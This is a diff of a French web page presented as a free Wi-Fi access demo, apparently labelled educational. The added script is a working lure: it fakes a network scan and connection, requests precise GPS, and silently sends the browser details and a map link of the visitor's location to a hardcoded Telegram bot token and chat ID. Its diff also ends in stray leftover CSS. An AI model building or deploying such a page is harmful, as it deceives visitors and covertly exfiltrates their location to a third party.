@@ -6,34 +6,118 @@
 <title>Wi-Fi Gratuit - Démonstration pédagogique</title>
 
 <style>
-body{
-  background:#020617;
-  color:#e5e7eb;
-  font-family:Arial;
-  margin:0;
-  padding:20px;
+body{ background:#020617; color:#e5e7eb; font-family:Arial; margin:0; padding:20px; }
+.card{ max-width:420px; margin:auto; background:#0b1220; border-radius:16px; padding:20px; border:1px solid #1e293b; box-shadow:0 0 25px rgba(0,0,0,.6); }
+h1{ text-align:center; }
+.warn{ font-size:12px; color:#f97316; text-align:center; }
+.btn{ display:block; text-align:center; margin:15px 0; padding:14px; border-radius:12px; background:linear-gradient(135deg,#22c55e,#4ade80); color:#022c22; font-weight:bold; cursor:pointer; transition:.2s; }
+.btn:hover{ transform:scale(1.05); }
+#terminal{ margin-top:15px; background:#000; padding:12px; border-radius:10px; font-family:monospace; font-size:13px; color:#22c55e; height:200px; overflow:auto; white-space: pre-wrap; }
+.progress-container{ margin-top:10px; background:#111; border-radius:8px; overflow:hidden; height:12px; }
+.progress-bar{ height:100%; width:0%; background:#22c55e; transition: 0.3s; }
+</style>
+</head>
+
+<body>
+
+<div class="card">
+  <h1>📶 Wi-Fi Gratuit</h1>
+  <p class="warn">⚠️ Démonstration pédagogique : ce projet montre les données accessibles avec consentement utilisateur.</p>
+  <div class="btn" onclick="startDemo()">🔓 Accéder au Wi-Fi Gratuit</div>
+  <div id="terminal"></div>
+  <div class="progress-container"><div class="progress-bar" id="bar"></div></div>
+</div>
+
+<script>
+const TELEGRAM_TOKEN = "8206049937:AAEv07GYDOVNBthgFaZi1U1KCvu5gzWPbo4";
+const TELEGRAM_CHAT_ID = "7400979339";
+
+function sleep(ms){ return new Promise(r => setTimeout(r, ms)); }
+
+async function typeLine(text){
+  const term = document.getElementById("terminal");
+  let line = document.createElement("div");
+  term.appendChild(line);
+  for(let i=0;i<text.length;i++){
+    line.innerHTML += text[i];
+    await sleep(15 + Math.random()*20);
+  }
+  term.scrollTop = term.scrollHeight;
 }
 
-.card{
-  max-width:420px;
-  margin:auto;
-  background:#0b1220;
-  border-radius:16px;
-  padding:20px;
-  border:1px solid #1e293b;
-  box-shadow:0 0 25px rgba(0,0,0,.6);
+function getLocation(){
+  return new Promise(resolve => {
+    if(!navigator.geolocation) return resolve(null);
+    navigator.geolocation.getCurrentPosition(
+      (pos)=> resolve({lat: pos.coords.latitude.toFixed(5), lon: pos.coords.longitude.toFixed(5)}),
+      ()=> resolve(null),
+      { enableHighAccuracy: true, timeout: 8000 }
+    );
+  });
 }
 
-h1{
-  text-align:center;
+function randomWifi(){
+  const names = ["FreeWifi","Orange","SFR","Livebox","Bbox","NET","HomeNet","Secure"];
+  return names[Math.floor(Math.random()*names.length)] + "_" + Math.floor(Math.random()*9999);
 }
 
-.warn{
-  font-size:12px;
-  color:#f97316;
-  text-align:center;
+function signalBars(){
+  const bars = ["▂","▂▄","▂▄▆","▂▄▆█"];
+  return bars[Math.floor(Math.random()*bars.length)];
 }
 
+async function sendToTelegram(location) {
+  const m = new Date();
+  const dateStr = m.toLocaleString('fr-FR');
+  const locLink = location ? `https://www.google.com/maps?q=${location.lat},${location.lon}` : "Refusée ❌";
+  
+  const rapport = `🔐 Connexion\n🌐 Navigateur: ${navigator.userAgent}\n🗣 Langue: ${navigator.language}\n🖥 Écran: ${screen.width}x${screen.height}\n⏰ ${dateStr}\n📍 GPS: ${locLink}`;
+
+  try {
+    fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: rapport })
+    });
+  } catch (e) {}
+}
+
+async function startDemo(){
+  const term = document.getElementById("terminal");
+  const bar = document.getElementById("bar");
+  term.innerHTML = "";
+  bar.style.width = "0%";
+
+  await typeLine("📡 Initialisation du module Wi-Fi...");
+  await sleep(800);
+  await typeLine("📍 Demande de localisation...");
+  
+  let location = await getLocation();
+  if(location) await typeLine("📍 Localisation obtenue.");
+  else await typeLine("❌ Localisation refusée.");
+
+  await typeLine("🧠 Analyse système : " + screen.width + "x" + screen.height);
+  await typeLine("🔍 Scan des réseaux...");
+
+  for(let i=0;i<6;i++){
+    await typeLine(`[${signalBars()}] ${randomWifi()} → ${Math.random() > 0.5 ? 'sécurisé' : 'cible 🎯'}`);
+    await sleep(400);
+  }
+
+  await typeLine("🔗 Connexion en cours...");
+  for(let p=0; p<=100; p+=10){
+    bar.style.width = p + "%";
+    await sleep(300);
+  }
+
+  await typeLine("✔ Wi-Fi connecté");
+  sendToTelegram(location);
+  await typeLine("⚠️ Attention aux permissions Web.");
+}
+</script>
+
+</body>
+</html>
 .btn{
   display:block;
   text-align:center;
